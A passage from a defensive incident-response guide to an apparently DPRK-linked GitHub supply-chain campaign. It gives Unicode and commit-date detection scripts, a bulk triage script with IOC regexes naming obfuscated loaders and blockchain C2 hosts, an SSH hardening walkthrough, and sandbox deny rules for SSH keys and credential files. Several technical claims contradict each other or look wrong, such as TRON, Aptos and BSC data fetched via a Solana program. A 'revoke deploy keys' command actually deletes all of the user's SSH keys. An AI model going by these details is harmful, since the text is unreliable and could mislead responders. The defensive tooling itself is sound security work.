---

Operation PolinRider: The Complete Developer's Guide to Detection, Containment, and Recovery
A four-part technical blueprint for security analysts, everyday developers, platform engineers, and anyone responding to the DPRK-linked supply chain campaign that compromised nearly 2,000 GitHub repositories in 2026 - updated to account for the font-file attack vector, evolving malware variants, and the gap between extension-based and content-based scanning

---

Who This Guide Is For
This guide is written in four self-contained parts, each aimed at a different reader. If you are a security analyst or incident responder trying to understand what happened and find it in your environment, start at Part 1. If you are an everyday developer who needs to lock down your machine today, jump to Part 2. If you are a platform engineer responsible for cleaning and hardening many repositories at once, Part 3 is for you. Part 4 addresses the font-file attack vector - a specific, confirmed PolinRider technique that the earlier detection scripts in Parts 1 through 3 do not catch, and that represents the direction the malware is most likely to evolve.
The parts build on each other logically, but each stands alone. Read the one you need first.

---

Urgency Note
As of May 2026, the PolinRider campaign has confirmed 1,951 compromised repositories across 1,047 unique owners. The attacker's tooling assigns a sequential victim ID to each injection - meaning they are actively tracking their own spread. If you have pulled from an unfamiliar repository, or installed a VS Code extension recommended by a recruiter or unknown contact in the past six months, treat your machine as potentially compromised until you have completed the steps in Part 2.

---

Background: What Is PolinRider and Why Does It Matter?
Before diving into detection scripts and sandbox profiles, it is worth spending a few minutes understanding why this campaign is different from a typical npm typosquatting incident or a phishing attack. That understanding is what makes every defensive step below feel less like cargo-cult security and more like a principled response to a specific threat.
PolinRider is a supply chain campaign attributed to DPRK-linked threat actors - specifically the Lazarus Group and its BlueNoroff subgroup, the same actors behind the 2023 RustBucket campaign and the 2024 Hidden Risk operation. Where those earlier campaigns targeted individual developers with fake job offers that included trojanised macOS applications, PolinRider represents a significant escalation in industrialisation. The attackers are no longer trying to compromise one developer at a time. They are trying to compromise the infrastructure developers trust: their IDE, their package manager, and their version control system - simultaneously.
The campaign has three named technical components, each attacking a different layer of the development lifecycle.
The Glassworm module handles initial infection of source code. It works by inserting invisible Unicode characters - specifically variation selectors (U+FE00 through U+FE0F), zero-width joiners (U+200D), and characters from the Unicode Private Use Area - into JavaScript and TypeScript source files. The critical insight here is that these characters are semantically invisible: they render as nothing in your text editor, in GitHub's diff viewer, and in code review tools. The code appears completely normal to the human eye, but the JavaScript engine parses the character boundaries differently at the byte level, producing a hidden execution path. This technique, sometimes called "Trojan Source," was first described academically in 2021, but PolinRider is the first campaign to deploy it at industrial scale against a live developer ecosystem.
The ForceMemo module handles persistence and history falsification. Using GitHub tokens stolen during the Glassworm phase, ForceMemo takes authenticated access to a target repository and rewrites its history: it rebases a malicious commit into the repository's past, then force-pushes, making the commit appear to have been authored weeks or months before the actual compromise. The committer date (when Git internally recorded the action) differs from the author date (the backdated claim), but most developers - and most security tools - never check this discrepancy. The result is that git log looks completely normal.
The BeaverTail second stage is the payload that executes after the malware is loaded. It retrieves encrypted instructions from blockchain networks - specifically TRON, Aptos, and Binance Smart Chain - by querying the Solana blockchain's Memo program. Using a blockchain as a command-and-control (C2) channel is strategically deliberate: you cannot take down a blockchain the way you can take down a domain or an IP address. The instructions are decrypted using XOR keys embedded in the loader and executed via eval(). Persistence is achieved through detached Node.js processes that survive the parent shell being closed.
The initial infection vector is a trojanised VS Code extension - often a utility that looks entirely legitimate (a linter, a formatter, an AI coding tool) that was either published by the attacker or poisoned via the extensionDependencies manifest field after reaching a critical mass of trusted installs. Because VS Code extensions auto-update by default, thousands of developers were infected without any manual action on their part.
Understanding this architecture is not academic. It tells you exactly where to look: your VS Code extensions directory, your source files' byte representation, your git commit metadata, and your running Node.js processes. It also tells you something more important: the attackers are not standing still. Part 4 of this guide covers a confirmed evolution of the campaign - the font-file disguise technique - and the broader design principle you need to adopt so that your defences do not fall behind each time the payload changes its shape.

---

Part 1: Incident Triage and Byte-Level Detection
For security analysts and incident responders. Goal: determine whether you are compromised, which repositories are affected, and find the exact injection commit in each one.
1.1 - Isolate Before You Investigate
The single most important rule in incident response is: do not let the compromised environment contaminate your investigation. If your workstation is infected, any git operations you run from it are potentially running attacker code. Any clone you make might immediately be re-infected by the running extension.
Your first actions should happen before you open a terminal.
Kill VS Code immediately. The extension is the live malware; it is running as long as VS Code is open.
# Kill VS Code and any related processes
pkill -f "Visual Studio Code"
pkill -f "code-server"
pkill -f "node.*vscode"
# Verify nothing is still running
ps aux | grep -i "code\|vscode" | grep -v grep
Use a different machine for your GitHub operations until you have cleaned the infected one. If you do not have a second machine, do everything through the GitHub web interface or your phone's browser. The goal is to ensure your investigation tools are not themselves running under attacker influence.
Revoke your GitHub tokens immediately - from a clean browser session, not from your infected machine. Go to GitHub → Settings → Developer settings → Personal access tokens and revoke everything. Go to Settings → SSH and GPG keys and delete all keys. Also check Settings → Applications → Authorised OAuth Apps for anything you do not recognise. The PolinRider malware operated in-process with your existing GitHub session, which means those tokens must be considered burned.
# Check what tokens are active locally (run from a different machine if possible)
gh auth token
# Revoke all deploy keys across all your repos
gh api /user/keys --paginate | jq '.[].id' | \
  xargs -I{} gh api -X DELETE /user/keys/{}
# List and audit OAuth apps
gh api /applications --paginate | jq '.[] | {name: .name, id: .id}'
Create a forensic snapshot before making any changes. This preserves the chain of evidence if you need to report the incident later.
# Mirror clone captures ALL refs, branches, and complete history
# Do this for each affected repo, from a clean machine
git clone --mirror git@github.com:OWNER/REPO.git ./forensic-REPO-$(date +%Y%m%d)
tar -czf forensic-REPO-$(date +%Y%m%d%H%M%S).tar.gz ./forensic-REPO-$(date +%Y%m%d)/
1.2 - Find and Remove the Malicious VS Code Extension
The extension is the root cause. Cleaning repositories without removing the extension first means your repos will be re-infected every time you open them.
# List all installed extensions with their install dates
ls -lt ~/.vscode/extensions/ | head -30
# Find extensions with suspicious activation events or scripts.
# The key field is "extensionDependencies" - this is how the attacker
# silently pulled in the malicious companion extension.
grep -r "extensionDependencies\|extensionPack" \
  ~/.vscode/extensions/*/package.json 2>/dev/null | \
  grep -v "^Binary"
# Scan for extensions that access the filesystem at activation
grep -r "\"onStartupFinished\"\|\"*\"\|\"onCommand\"" \
  ~/.vscode/extensions/*/package.json 2>/dev/null | \
  grep -v "^Binary" | head -30
# Find any extension that references filesystem, child_process, or network
grep -rn \
  "require('fs')\|require(\"fs\")\|child_process\|fetch\|https\." \
  ~/.vscode/extensions/*/extension.js \
  ~/.vscode/extensions/*/dist/extension.js \
  2>/dev/null | grep -v "^Binary" | head -40
# Look specifically for the Glassworm loader pattern in extension code
grep -rn \
  "eval(\|Buffer.from\|atob(\|trongrid\|aptos\|bscscan\|XOR\|_V.*8-" \
  ~/.vscode/extensions/ 2>/dev/null | grep -v "^Binary"
When you find the malicious extension, remove it and verify:
# Remove it
rm -rf ~/.vscode/extensions/SUSPICIOUS-EXTENSION-NAME/
# Verify VS Code will not restore it automatically
# Add to ~/.vscode/settings.json (user level):
# "extensions.autoUpdate": false
# "extensions.autoCheckUpdates": false
# Rebuild the extension manifest so VS Code does not try to reload it
ls ~/.vscode/extensions/ > /tmp/extensions-after-clean.txt
1.3 - The Byte-Level Glassworm Scan
This is the part that most generic malware scanners miss. Standard grep searches for text strings, but Glassworm's payload is invisible - it lives between characters as non-printing Unicode code points. You need to scan at the byte level.
To understand why this works, consider what happens when the JavaScript engine encounters a variation selector like U+FE0F. To the human eye reviewing the source file or the git diff, this character is literally invisible - it has zero visual width and no glyph. But to the parser, it is a real character that can encode information using the Chinese Remainder Theorem across multiple such characters. The attacker uses a sequence of these characters to encode encrypted bytecode, which is then decoded and executed at runtime.
# Scan for invisible Unicode in all source files using Perl-compatible regex
# This catches: zero-width spaces, joiners, variation selectors, PUA, BOM mid-file
grep -rPn \
  '[\x{200B}-\x{200F}\x{202A}-\x{202E}\x{2060}-\x{2064}\x{FE00}-\x{FE0F}\x{E000}-\x{F8FF}\x{FEFF}]' \
  --include='*.js' \
  --include='*.ts' \
  --include='*.mjs' \
  --include='*.cjs' \
  --include='*.py' \
  . 2>/dev/null
# Scan for Unicode direction override attacks specifically.
# U+202E (right-to-left override) makes filenames and code appear backwards.
grep -rPn '[\x{202A}-\x{202E}\x{2066}-\x{2069}]' \
  --include='*.js' --include='*.ts' --include='*.py' .
# Dump raw bytes of a suspicious file to see what is actually there.
# ef b8 8x = variation selector bytes (0xFE0x in UTF-8)
# e2 80 8b = U+200B zero-width space
# e2 80 8d = U+200D zero-width joiner
xxd suspicious-file.js | grep -E "e2 80 8[b-f]|ef b8|ee 80|ef bb bf"
The following Python script gives you a precise, human-readable report of every non-ASCII character in a file, with its line number, column, Unicode code point, and category name. This is the tool you want when you find a suspicious file and need to understand exactly what is in it.
#!/usr/bin/env python3
# unicode-audit.py - produce a precise byte-level audit of a source file
# Usage: python3 unicode-audit.py suspicious-file.js
import sys
import unicodedata
# Unicode ranges that are suspicious in source code context.
# This list is designed to be extensible: if the malware evolves to use
# a new range (e.g., Specials block U+FFF0–U+FFFF, or Tags block U+E0000–U+E007F),
# simply add a new tuple here and the rest of the script handles it.
SUSPICIOUS_RANGES = [
    (0x200B, 0x200F, "Zero-width characters"),
    (0x202A, 0x202E, "Unicode direction overrides"),
    (0x2060, 0x2064, "Word joiners"),
    (0xFE00, 0xFE0F, "Variation selectors (Glassworm primary vector)"),
    (0xE000, 0xF8FF, "Private Use Area"),
    (0xFEFF, 0xFEFF, "BOM / Zero-width no-break space"),
    (0x2066, 0x2069, "Directional isolates"),
    # Extended coverage for future variants:
    (0xFFF0, 0xFFFF, "Specials block"),
    (0xE0000, 0xE007F, "Tags block (Unicode steganography)"),
]
def is_suspicious(codepoint):
    return any(lo <= codepoint <= hi for lo, hi, _ in SUSPICIOUS_RANGES)
def category_name(codepoint):
    for lo, hi, name in SUSPICIOUS_RANGES:
        if lo <= codepoint <= hi:
            return name
    return "Other non-ASCII"
def audit_file(filepath):
    findings = []
    try:
        with open(filepath, encoding='utf-8', errors='replace') as f:
            for lineno, line in enumerate(f, 1):
                for colno, ch in enumerate(line, 1):
                    cp = ord(ch)
                    if cp > 127 and is_suspicious(cp):
                        findings.append({
                            'line': lineno,
                            'col': colno,
                            'codepoint': cp,
                            'hex': f'U+{cp:04X}',
                            'category': category_name(cp),
                            'unicode_name': unicodedata.name(ch, 'UNKNOWN'),
                            'context': line.rstrip()[:80]
                        })
    except Exception as e:
        print(f"Error reading {filepath}: {e}", file=sys.stderr)
        return
    if not findings:
        print(f"CLEAN: {filepath}")
        return
    print(f"\n{'='*60}")
    print(f"SUSPICIOUS: {filepath} - {len(findings)} invisible character(s) found")
    print(f"{'='*60}")
    for f in findings:
        print(f"  Line {f['line']}, Col {f['col']}: {f['hex']} [{f['category']}]")
        print(f"    Name: {f['unicode_name']}")
        print(f"    Context: {f['context']}")
    print()
if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: python3 unicode-audit.py <file> [file2 ...]")
        sys.exit(1)
    for path in sys.argv[1:]:
        audit_file(path)
You can run this recursively across an entire project tree:
# Run against all JS/TS files in the current directory tree
find . -name '*.js' -o -name '*.ts' -o -name '*.mjs' | \
  grep -v node_modules | grep -v .git | \
  xargs python3 unicode-audit.py 2>/dev/null
1.4 - The ForceMemo Commit Date Analysis
ForceMemo's history falsification leaves a specific, detectable fingerprint: the git committer date (when the object was actually written into the database) and the author date (the backdated claim) will differ by hours or days. Legitimate commits almost never have a large gap between these two timestamps. An attacker rebasing a commit from today and backdating it to three months ago will have a gap of roughly ninety days.
The following Python script walks the entire git history of a repository and flags any commit where the author/committer date gap exceeds a configurable threshold. It is tuned to produce zero false positives on normal rebased commits (which typically have gaps of minutes, not days) while catching the kind of large backdating that ForceMemo performs.
#!/usr/bin/env python3
# forcememo-detector.py - detect history-falsification in a git repository
# Usage: python3 forcememo-detector.py /path/to/repo [--threshold-hours 24]
#
# How it works: legitimate rebases create small date gaps (seconds to minutes)
# because the developer runs the rebase immediately after the original commit.
# ForceMemo backdates by weeks or months, creating a gap of thousands of hours.
import subprocess
import sys
import argparse
from datetime import datetime, timezone
def get_all_commits(repo_path):
    """
    Use git log with a format that gives us both dates for every commit.
    %H  = full commit hash
    %ae = author email
    %ai = author date ISO 8601
    %ci = committer date ISO 8601
    %s  = subject (first line of commit message)
    """
    result = subprocess.run(
        ['git', 'log', '--all', '--format=%H\t%ae\t%ai\t%ci\t%s'],
        cwd=repo_path,
        capture_output=True,
        text=True
    )
    if result.returncode != 0:
        print(f"Error running git log: {result.stderr}", file=sys.stderr)
        sys.exit(1)
    return result.stdout.strip().split('\n')
def parse_git_date(date_str):
    """
    Parse a git ISO 8601 date string into a timezone-aware datetime.
    Git outputs dates like: 2026-03-15 14:22:01 +0100
    """
    date_str = date_str.strip()
    # Python's fromisoformat handles +HH:MM but git uses +HHMM (no colon)
    if len(date_str) > 5 and date_str[-5] in ('+', '-') and ':' not in date_str[-5:]:
        date_str = date_str[:-2] + ':' + date_str[-2:]
    return datetime.fromisoformat(date_str)
def analyse_repository(repo_path, threshold_hours=24):
    commits = get_all_commits(repo_path)
    suspicious = []
    errors = []
    for line in commits:
        if not line.strip():
            continue
        parts = line.split('\t', 4)
        if len(parts) < 5:
            continue
        commit_hash, author_email, author_date_str, committer_date_str, subject = parts
        try:
            author_date = parse_git_date(author_date_str)
            committer_date = parse_git_date(committer_date_str)
        except ValueError as e:
            errors.append(f"Could not parse dates for {commit_hash[:12]}: {e}")
            continue
        gap_seconds = abs((committer_date - author_date).total_seconds())
        gap_hours = gap_seconds / 3600
        if gap_hours > threshold_hours:
            suspicious.append({
                'hash': commit_hash[:16],
                'email': author_email,
                'author_date': author_date_str.split('.')[0],
                'committer_date': committer_date_str.split('.')[0],
                'gap_hours': round(gap_hours, 1),
                'gap_days': round(gap_hours / 24, 1),
                'subject': subject[:70]
            })
    return suspicious, errors
def main():
    parser = argparse.ArgumentParser(description='Detect ForceMemo history falsification')
    parser.add_argument('repo', help='Path to the git repository')
    parser.add_argument('--threshold-hours', type=int, default=24,
                        help='Minimum gap in hours to flag as suspicious (default: 24)')
    args = parser.parse_args()
    print(f"Analysing {args.repo} (threshold: >{args.threshold_hours}h gap)...")
    suspicious, errors = analyse_repository(args.repo, args.threshold_hours)
    if errors:
        print(f"\n[Parsing errors - {len(errors)} commits could not be analysed]")
        for e in errors[:5]:
            print(f"  {e}")
    if not suspicious:
        print("\nCLEAN: No suspicious author/committer date gaps found.")
        return 0
    print(f"\n{'='*70}")
    print(f"SUSPECT COMMITS: {len(suspicious)} commits with large date gaps")
    print(f"{'='*70}")
    print(f"{'Hash':<18} {'Gap':<10} {'Author Date':<22} {'Email'}")
    print(f"{'-'*18} {'-'*10} {'-'*22} {'-'*30}")
    for c in sorted(suspicious, key=lambda x: x['gap_hours'], reverse=True):
        flag = " <-- CRITICAL" if c['gap_hours'] > 720 else ""  # >30 days
        print(f"{c['hash']:<18} {c['gap_days']:>5.1f} days  {c['author_date']:<22} {c['email']}{flag}")
        print(f"  Subject: {c['subject']}")
    return 1
if __name__ == '__main__':
    sys.exit(main())
1.5 - Automated Multi-Repository Triage
When you have many repositories to check, running manual scans on each one is not viable. The following script runs the full suite of IOC checks across a directory of git repositories and produces a structured TSV report that tells you exactly which repos are compromised, which commit introduced the payload, how many legitimate developer commits exist on top of it, and which files were hit.
This report becomes the input to the surgical cleaner in Part 3.
#!/bin/bash
# triage-repos.sh - bulk IOC scan across a directory of git repository clones
#
# Usage: ./triage-repos.sh /path/to/repos/directory
# Output: triage-report.tsv (tab-separated, importable into Excel or Numbers)
#
# The script checks for:
#   1. PolinRider version tag markers (global['_V']='8-')
#   2. BeaverTail blockchain C2 strings (trongrid, aptos, bscscan)
#   3. eval(Buffer.from...) obfuscated loader pattern
#   4. Glassworm invisible Unicode characters (byte-level scan)
#   5. Large author/committer date gaps (ForceMemo history falsification)
#
# EXTENSIBILITY NOTE: The IOC_PATTERNS array below uses regex strings.
# As new PolinRider variants are discovered, add new patterns here.
# The rest of the script will automatically apply them to all repos.
# Do NOT hardcode version strings - use flexible regex that tolerates
# minor obfuscation (spacing changes, quote style, variable name shuffles).
REPO_DIR="${1:-.}"
REPORT="triage-report-$(date +%Y%m%d%H%M%S).tsv"
THRESHOLD_HOURS=24
# IOC patterns - flexible regex designed to survive minor variant evolution.
# Each pattern is anchored to the structural signature of the injection,
# not a brittle literal string that the attacker can trivially change.
IOC_PATTERNS=(
    "global\[.{0,5}_V.{0,5}\]=.{0,5}8-"    # PolinRider variant 2 version tag (any quote style)
    "eval\s*\(\s*Buffer\.from"               # BeaverTail stage-1 loader
    "trongrid\.io"                           # TRON blockchain C2
    "fullnode\.mainnet\.aptoslabs"           # Aptos blockchain C2
    "bsc-dataseed"                           # BSC blockchain C2
    "rmcej.{0,5}otb"                         # PolinRider variant 1 marker
)
echo "PolinRider triage scan - $(date)"
echo "Scanning: $REPO_DIR"
echo ""
echo -e "repo\tstatus\tinjection_hash\tinjection_date\tauthor_email\tfiles_hit\tlegit_commits_on_top\tioc_type\tnotes" \
    > "$REPORT"
CLEAN_COUNT=0
COMPROMISED_COUNT=0
for REPO in "$REPO_DIR"/*/; do
    [[ ! -d "$REPO/.git" ]] && continue
    REPO_NAME=$(basename "$REPO")
    INJECT_HASH=""
    IOC_TYPE=""
    COMBINED_PATTERN=$(IFS='|'; echo "${IOC_PATTERNS[*]}")
    MATCH=$(cd "$REPO" && git log --all -p \
        --format="COMMIT:%H:%ae:%ci" \
        -- '*.js' '*.mjs' '*.cjs' '*.ts' 2>/dev/null | \
        awk -v pat="$COMBINED_PATTERN" '
            /^COMMIT:/ { current_commit = $0; next }
            /^\+/ && $0 !~ /^\+\+\+/ && $0 ~ pat {
                print current_commit
                exit
            }
        ')
    if [[ -n "$MATCH" ]]; then
        IFS=':' read -r _ INJECT_HASH AUTHOR_EMAIL INJECT_DATE <<< "$MATCH"
        for PATTERN in "${IOC_PATTERNS[@]}"; do
            CHECK=$(cd "$REPO" && git show "$INJECT_HASH" 2>/dev/null | \
                grep -cE "$PATTERN" || true)
            if [[ "$CHECK" -gt 0 ]]; then
                IOC_TYPE="$PATTERN"
                break
            fi
        done
        FILES_HIT=$(cd "$REPO" && git show --name-only "$INJECT_HASH" 2>/dev/null | \
            tail -n +2 | grep -c '\.' || true)
        COMMITS_ON_TOP=$(cd "$REPO" && git rev-list "${INJECT_HASH}..HEAD" 2>/dev/null | \
            wc -l | tr -d ' ')
        echo -e "${REPO_NAME}\tCOMPROMISED\t${INJECT_HASH:0:16}\t${INJECT_DATE}\t${AUTHOR_EMAIL}\t${FILES_HIT}\t${COMMITS_ON_TOP}\t${IOC_TYPE}\t" \
            >> "$REPORT"
        echo "[COMPROMISED] $REPO_NAME"
        echo "  Injection: ${INJECT_HASH:0:16} on $INJECT_DATE by $AUTHOR_EMAIL"
        echo "  IOC: $IOC_TYPE"
        echo "  Legit commits on top: $COMMITS_ON_TOP"
        ((COMPROMISED_COUNT++))
    else
        UNICODE_HIT=$(cd "$REPO" && git grep -P \
            '[\x{200B}-\x{200F}\x{202A}-\x{202E}\x{FE00}-\x{FE0F}\x{E000}-\x{F8FF}]' \
            -- '*.js' '*.mjs' 2>/dev/null | head -1 || true)
        if [[ -n "$UNICODE_HIT" ]]; then
            echo -e "${REPO_NAME}\tGLASSWORM_SUSPECT\t-\t-\t-\t-\t-\tinvisible-unicode\t${UNICODE_HIT:0:80}" \
                >> "$REPORT"
            echo "[GLASSWORM SUSPECT] $REPO_NAME - invisible Unicode found, manual byte-level review needed"
            ((COMPROMISED_COUNT++))
        else
            echo -e "${REPO_NAME}\tCLEAN\t-\t-\t-\t-\t-\t-\t-" >> "$REPORT"
            ((CLEAN_COUNT++))
        fi
    fi
done
echo ""
echo "========================================"
echo "TRIAGE COMPLETE"
echo "  Clean:       $CLEAN_COUNT repos"
echo "  Compromised: $COMPROMISED_COUNT repos"
echo "  Report:      $REPORT"
echo "========================================"

---

Part 2: Workstation Containment and Runtime Isolation
For everyday developers. Goal: harden your local machine so that even if you encounter infected code in the future, it cannot reach your SSH keys, your credentials, your shell configuration, or your other projects.
The Mental Model: Treat Every Project as Untrusted Code
Before we look at any specific tool, it is worth internalising a mental shift that makes everything else in this section feel natural rather than burdensome.
Every time you clone a repository and run npm install or npm run dev, you are executing arbitrary code with your full user permissions. The node_modules directory after a clean install of a medium-sized JavaScript project may contain hundreds of postinstall scripts - little programs that run automatically with no confirmation, no sandbox, and full access to your filesystem, your environment variables, and your network. This has always been true. PolinRider simply exploited it in a more systematic way than we had seen before.
The good news is that the operating system already has the tools to contain this. On macOS, the kernel-level Seatbelt sandbox framework has been present since OS X 10.5 Leopard. The sandbox-exec command exposes it from the terminal with a Scheme-based policy language. On Linux, you have firejail and bubblewrap. Neither requires Docker, a VM, or any additional software installation on macOS.
The strategy is: run development tools normally, but wrap them in a policy that says "you may read and write your project directory, you may use the network, but you may not touch ~/.ssh, you may not modify my shell profile, and you may not read credentials from other projects."
2.1 - Securing SSH Keys with Hardware Backing
Your private keys shouldn't live on disk. Here's how to move them somewhere an attacker can never reach - and require your fingerprint for every single use.

---

There is a quiet assumption baked into most developer setups: that the files sitting in ~/.ssh/ are safe because they're yours. They're not. Any process running as your user - a compromised npm package, a malicious VS Code extension, a piece of malware that hitched a ride on a tool you installed - can read every private key in that directory without asking permission, without triggering a prompt, without leaving a trace.
The deeper problem is not just theft. It's silent impersonation. Once malware has your key, it doesn't need to copy it anywhere. It can talk directly to ssh-agent while you're sitting at your desk, and your GitHub account will accept every connection as if you made it yourself. That is exactly how force-push attacks happen: the attacker isn't breaking in - they're walking in through your own door.
Hardware-backed keys close this attack entirely. The private key is generated inside a secure chip on your machine and never leaves it - not to disk, not to memory, not to any process. Every SSH operation requires the chip to perform the cryptographic work itself. And on a Mac with a T2 chip or Apple Silicon, you can bind that operation to Touch ID, so that your fingerprint is the only thing that authorises an SSH connection. Malware cannot fake a fingerprint.
This guide will walk you through setting that up using Secretive, a free, open source macOS app that puts your SSH keys inside the Secure Enclave and exposes them through a standard SSH agent interface. You will end the guide with two GitHub accounts - personal and work - each backed by a hardware key that requires Touch ID on every use.

---

Why ssh-keygen Alone Won't Get You There
You may have seen documentation suggesting you can create a Secure Enclave-backed key with:
ssh-keygen -t ed25519-sk -O resident ...
On macOS, this command fails unless you have a physical FIDO2 device plugged in. OpenSSH's -sk key type is designed around external hardware tokens, not the Secure Enclave built into your Mac. The two are different security subsystems, and ssh-keygen does not know how to talk to the Secure Enclave directly.
Secretive bridges this gap. It is a small native app that generates keys inside the Secure Enclave and then presents them to the rest of your system as a standard SSH agent. From git's perspective, nothing changes. From a security perspective, everything does.

---

Installing Secretive
Download the latest release from the official GitHub repository:
https://github.com/maxgoedjen/secretive/releases
or 
brew install secretive
Move Secretive.app to your /Applications folder and open it. On first launch, it will ask you to configure your shell to use its agent socket. Accept this - it adds a single line to your shell profile that points SSH to Secretive's agent instead of the default one.
You can also configure it manually. Add the following to ~/.zshrc (or ~/.bashrc if you use bash), replacing YOUR_USERNAME with your actual macOS username:
# Direct SSH to use Secretive's agent
export SSH_AUTH_SOCK=/Users/YOUR_USERNAME/Library/Containers/com.maxgoedjen.Secretive.SecretAgent/Data/socket.ssh
Restart your terminal after saving. You can verify Secretive is running as your agent with:
echo $SSH_AUTH_SOCK
# Should print the path above, not /tmp/com.apple.launchd.*/Listeners

---

Generating Two Hardware-Backed Keys
You will create one key for your personal GitHub account and one for your work GitHub account. Each key is a separate entry in the Secure Enclave, with its own Touch ID prompt.
Open Secretive. In the sidebar, click + to create a new key. You will see two options: Secure Enclave and Smart Card. Choose Secure Enclave for both keys.
Give the first key a clear name - something like GitHub Personal - and create it. Repeat the process and name the second key GitHub Work. Secretive will display the public key for each. You do not need to save these anywhere yet; you can copy them again at any time from within the app.
A note on what just happened: unlikessh-keygen, no files were written to ~/.ssh/. The private key material was generated entirely within the Secure Enclave and has never existed outside of it. There is no id_ed25519 file for malware to find.

---

Adding Public Keys to GitHub
For each account, navigate to Settings → SSH and GPG keys → New SSH key on GitHub.
In Secretive, click on a key to reveal its public key string. Copy it and paste it into GitHub. Give it a recognisable label - MacBook Secure Enclave works well. Repeat for the second account.

---

Wiring Two Accounts with SSH Config
This is the step that trips most developers. GitHub's hostname is github.com for both accounts, which means SSH has no way of knowing which key to use unless you tell it explicitly. You do that by creating host aliases - local names that map to GitHub but carry different identity instructions.
Open ~/.ssh/config in your editor. If the file does not exist, create it. Add the following, replacing the IdentityFile paths with the actual paths Secretive shows for each key (right-click a key in Secretive → Copy Public Key Path to get the exact path):
# Secretive agent - applies globally
Host *
    IdentityAgent /Users/YOUR_USERNAME/Library/Containers/com.maxgoedjen.Secretive.SecretAgent/Data/socket.ssh
# Personal GitHub account
Host github-personal
    HostName github.com
    User git
    IdentityFile /Users/YOUR_USERNAME/Library/Containers/com.maxgoedjen.Secretive.SecretAgent/Data/PublicKeys/YOUR_PERSONAL_KEY_UUID.pub
    IdentitiesOnly yes
# Work GitHub account
Host github-work
    HostName github.com
    User git
    IdentityFile /Users/YOUR_USERNAME/Library/Containers/com.maxgoedjen.Secretive.SecretAgent/Data/PublicKeys/YOUR_WORK_KEY_UUID.pub
    IdentitiesOnly yes
The IdentityFile line pointing to a .pub file may look unusual - SSH agent files are normally private keys. Here, it serves only as a hint: it tells Secretive which key to present to GitHub. The private key itself still never leaves the chip. The IdentitiesOnly yes line is critical; without it, SSH may offer other keys as fallback, undermining the per-account isolation.
Lock down the config file permissions:
chmod 600 ~/.ssh/config

---

Testing the Connection
Verify each alias with a test connection. Secretive will intercept the request and prompt for Touch ID before proceeding:
# Test personal account - should prompt Touch ID, then print "Hi personal-username!"
ssh -T git@github-personal
# Test work account - should prompt Touch ID, then print "Hi work-username!"
ssh -T git@github-work
If you see an authentication failure, double-check that the public key in Secretive matches exactly what you pasted into GitHub's SSH settings.

---

Using the Aliases Day-to-Day
When cloning a repository, use the host alias instead of github.com:
# Personal repo
git clone git@github-personal:your-personal-username/repo.git
# Work repo
git clone git@github-work:your-work-org/repo.git
For repositories you have already cloned, update their remote URL:
# Check what the current remote is
git remote -v
# Update it to use the correct alias
git remote set-url origin git@github-personal:your-personal-username/repo.git
If you use HTTPS URLs anywhere - in scripts, CI configuration, or git credential helpers - redirect them to go through SSH instead:
# Rewrite personal HTTPS URLs to use the personal SSH alias
git config --global url."git@github-personal:your-personal-username/".insteadOf "https://github.com/your-personal-username/"
# Rewrite work HTTPS URLs to use the work SSH alias
git config --global url."git@github-work:your-work-org/".insteadOf "https://github.com/your-work-org/"
This ensures that even tooling which hardcodes HTTPS GitHub URLs will end up going through your hardware-backed key rather than any cached token.

---

What the Threat Model Looks Like Now
Consider what an attacker would need to do to impersonate you on GitHub after this setup:
They cannot read a private key file, because no private key file exists. They cannot query the SSH agent silently, because every agent request requires a Touch ID response that only you can provide. They cannot extract the key from the Secure Enclave, because the chip is designed to make that physically impossible - even with root access to your machine. They cannot replay a previous authentication, because each SSH handshake is a fresh cryptographic operation performed inside the chip.
The only remaining attack surface is a session that you explicitly authorise - a git push you perform yourself, with your fingerprint, in the normal course of your work. That is the floor you are aiming for.
One thing this setup does not protect against is stored Personal Access Tokens or GitHub CLI credentials sitting elsewhere on disk. If you had those before, revoke them:
# Remove GitHub CLI stored token if present
gh auth logout
# Revoke all active sessions
# github.com → Settings → Sessions → Revoke all
# github.com → Settings → Developer settings → Personal access tokens → Delete all
After that, your only path to GitHub is through the Secure Enclave - and the Secure Enclave only opens when you say so, with your finger.

---

Secretive is maintained by Max Goedjen and available at github.com/maxgoedjen/secretive under the MIT licence. It is not affiliated with Apple or GitHub.
2.2 - The sandbox-exec Profiles
sandbox-exec is the developer-friendly alternative to running a full Docker container for every project interaction. The core concept is a policy file (.sb extension) written in a Lisp-like syntax that defines exactly what a process is allowed to do. The policy is enforced at the kernel level - there is no way for a userspace process to bypass it.
One important caveat: sandbox-exec is technically marked as deprecated by Apple, who prefer that applications use the App Sandbox framework. However, "deprecated" in Apple's terminology means "we may remove this in a future major OS version" - not "this is broken." The underlying Seatbelt kernel subsystem remains the standard for macOS sandboxing and is used by Apple's own processes including BlastDoor. It is reasonable to build a workflow on top of it, with the awareness that a Dev Container is the more future-proof solution for anyone who needs cross-platform or long-term stability.
Here are the three profiles you need, followed by the sb wrapper script that makes using them as natural as adding a prefix to any command.
Profile 1: read-only-home.sb - the everyday development profile. It blocks access to your SSH directory, prevents any modification of your shell profiles, and stops the process from reading credentials from other projects, while allowing normal development work.
; ~/.config/sandbox/read-only-home.sb
; Everyday development sandbox for untrusted projects.
; Blocks SSH, shell profiles, and credentials. Allows normal dev work.
;
; Parameters (passed via -D flags to sandbox-exec):
;   HOME      - your home directory path
;   WORKDIR   - the project directory (current working directory)
;   SSH_AUTH_SOCK - the SSH agent socket path
(version 1)
; Import Apple's bsd.sb - grants access to system libraries, /dev,
; /tmp, /usr/bin tools, locale data, and other things every process needs.
(import "/System/Library/Sandbox/Profiles/bsd.sb")
; ======= HARD BLOCKS =======
; Never read or write the SSH directory.
(deny file-read* file-write*
    (subpath (string-append (param "HOME") "/.ssh")))
; Never modify shell profiles.
; An attacker appending to ~/.zshrc is the classic persistence escape.
(deny file-write*
    (literal (string-append (param "HOME") "/.zshrc"))
    (literal (string-append (param "HOME") "/.bashrc"))
    (literal (string-append (param "HOME") "/.bash_profile"))
    (literal (string-append (param "HOME") "/.profile"))
    (literal (string-append (param "HOME") "/.zprofile"))
    (literal (string-append (param "HOME") "/.zshenv")))
; Never read git credentials, GitHub CLI auth, or npm token.
(deny file-read*
    (literal (string-append (param "HOME") "/.gitconfig"))
    (literal (string-append (param "HOME") "/.npmrc"))
    (literal (string-append (param "HOME") "/.config/gh/hosts.yml"))
    (literal (string-append (param "HOME") "/.netrc")))
; Block access to sibling project directories.
; Replace these paths with wherever you keep your projects.
(deny file-read* file-write*
    (subpath (string-append (param "HOME") "/projects"))
